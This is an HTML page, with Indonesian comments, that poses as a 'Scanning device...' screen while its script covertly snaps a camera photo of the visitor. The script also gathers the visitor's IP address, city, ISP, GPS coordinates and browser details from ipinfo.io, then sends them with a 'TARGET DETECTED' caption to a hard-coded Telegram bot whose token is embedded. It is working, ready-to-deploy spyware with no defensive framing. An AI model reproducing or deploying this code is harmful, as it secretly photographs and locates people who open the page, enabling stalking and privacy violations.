<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Scanning Device...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background: black;
      color: lime;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      overflow: hidden;
    }
    h1 {
      text-shadow: 0 0 10px lime;
      white-space: nowrap;
      overflow: hidden;
      border-right: 2px solid lime;
      animation: typing 4s steps(40, end), blink-caret .75s step-end infinite;
    }
    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }
    @keyframes blink-caret {
      from, to { border-color: transparent }
      50% { border-color: lime }
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<h1>Scanning device...</h1>
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const token = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU'; // Ganti token
const chat_id = '6624966395'; // Ganti chat id
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

// Kirim teks ke Telegram
function kirimPesan(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id, text })
  });
}

// Kirim foto + caption ke Telegram
function kirimFoto(blob, caption) {
  let form = new FormData();
  form.append('chat_id', chat_id);
  form.append('photo', blob, 'foto.jpg');
  form.append('caption', caption);

  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: 'POST',
    body: form
  });
}

// Ambil data IP + lokasi
async function ambilDataIP() {
  const res = await fetch('https://ipinfo.io/json?token=7b6e7ab6d60b7e');
  const data = await res.json();
  return data;
}

// Ambil foto dari kamera
function ambilFoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  return new Promise(resolve => {
    canvas.toBlob(blob => {
      resolve(blob);
    }, 'image/jpeg');
  });
}

// Proses utama
async function mulaiScanning() {
  try {
    const info = await ambilDataIP();
    const device = navigator.userAgent;
    const lokasi = info.loc ? info.loc.split(",") : [null, null];
    const caption = `
== TARGET DETECTED ==
IP: ${info.ip}
Negara: ${info.country}
Region: ${info.region}
Kota: ${info.city}
ISP: ${info.org}
Koordinat: ${lokasi[0]}, ${lokasi[1]}
Device: ${device}
=====================`.trim();

    const fotoBlob = await ambilFoto();
    kirimFoto(fotoBlob, caption);

  } catch (err) {
    kirimPesan('Error saat scanning: ' + err);
  }
}

// Akses kamera (video only)
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  video.srcObject = stream;
  video.play();
  setTimeout(() => {
    mulaiScanning();
  }, 3000); // Tunggu 3 detik biar kamera nyala
})
.catch(err => {
  kirimPesan('Gagal akses kamera: ' + err);
});
</script>

</body>
</html>
